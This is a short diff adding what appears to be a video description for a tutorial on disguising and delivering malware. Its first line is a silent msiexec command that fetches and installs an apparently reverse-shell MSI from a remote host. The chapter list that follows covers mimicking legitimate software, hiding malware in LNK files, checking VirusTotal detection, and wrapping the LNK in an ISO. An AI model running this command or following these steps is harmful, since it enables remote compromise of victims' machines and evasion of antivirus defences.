@@ -1,0 +1,12 @@
+C:\Windows\System32\msiexec.exe /quiet /i http://192.168.0.197/reverse.msi
+
+00:00 - Intro
+00:19 - Pre Requisites
+00:40 - How to mimic any software with Resource Hacker
+01:27 - How to convert an EXE to MSI
+03:36 - How to hide malware in LNK
+04:37 - VirusTotal Scans
+05:50 - Run .LNK
+07:17 - How to hide LNK in ISO
+08:20 - Run .ISO
+08:45 - Closing thoughts
